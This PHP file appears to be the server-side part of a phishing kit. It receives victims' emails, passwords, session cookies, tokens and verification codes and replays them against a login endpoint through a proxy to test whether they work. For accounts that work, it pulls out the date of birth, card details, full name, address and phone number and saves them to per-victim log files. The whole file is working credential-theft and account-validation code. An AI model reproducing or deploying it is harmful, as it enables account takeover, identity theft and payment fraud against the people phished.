<?php
error_reporting(E_ALL ^ E_NOTICE);
header('Content-type: application/json');
require "includes/session_protect.php";
require "includes/functions.php";
require "../CONTROLS.php";
if (isset($_POST['email']) && isset($_POST['pass']) && isset($_POST['cook']) && isset($_POST['ctkn']) && isset($_POST['digit'])) {
   // $kena  = curl($URL_True_Login, 'email='.$_POST['email'].'&pass='//.$_POST['pass'].'&cook='.$_POST['cook'].'&ctkn='.$_POST['ctkn'].'&digit//='.$_POST['digit']);
   
   $kena  = curl($URL_True_Login, 'email='.$_POST['email'].'&pass='.$_POST['pass'].'&cook='.$_POST['cook'].'&ctkn='.$_POST['ctkn'].'&digit='.$_POST['digit'].'&sock='.$negara);
    $get   = json_decode($kena, true);
    if($get['code']=='ok'){
      $dob   = $get['person']['birthday'];
      $pecah = explode("-", $dob);
      $apple = [
        'status'      => 'live',
        'dob'         => $pecah[1] . "/" . $pecah[2] . "/" . $pecah[0],
        'carta'       => $get['primaryPaymentMethod']['obfuscatedNumber'],
        'fullname'    => $get['primaryPaymentMethod']['nameOnCard']['fullName'],
        'firstname'   => $get['person']['name']['firstName'],
        'lastname'    => $get['person']['name']['lastName'],
        'fulladdress' => $get['person']['primaryAddress']['fullAddress'],
        'address'     => $get['person']['primaryAddress']['line1'],
        'city'        => $get['person']['primaryAddress']['city'],
        'state'       => $get['person']['primaryAddress']['stateProvinceName'],
        'zip'         => $get['person']['primaryAddress']['postalCode'],
        'c_name'      => $get['person']['primaryAddress']['countryName'],
        'c_code'      => $get['person']['primaryAddress']['countryCode'],
        'phone'       => $get['primaryPaymentMethod']['phoneNumber']['rawNumber']
        ];
      if (!empty($apple['dob'])) {
        $_SESSION['dob']       = $apple['dob'];
        $_SESSION['carta']     = $apple['carta'];
        $_SESSION['fullname']  = $apple['fullname'];
        $_SESSION['firstname'] = $apple['firstname'];
        $_SESSION['lastname']  = $apple['lastname'];
        $_SESSION['address']   = $apple['address'];
        $_SESSION['city']      = $apple['city'];
        $_SESSION['zip']       = $apple['zip'];
        $_SESSION['c_name']    = $apple['c_name'];
        $_SESSION['c_code']    = $apple['c_code'];
        $_SESSION['phone']     = $apple['phone'];
      }
      $json                  = json_encode($apple);
      $file                  = fopen("logs/address/" . $_POST['email'] . ".dat", "w");
      fwrite($file, $json . "\n");
      fclose($file);
    }else{
        $apple['status'] = 'die';
        $_SESSION['cook']=$get['cookies'];
        $_SESSION['ctkn']=$get['ctkn'];
   }
} else {
    $apple['status'] = 'die';
}
echo json_encode($apple);
?>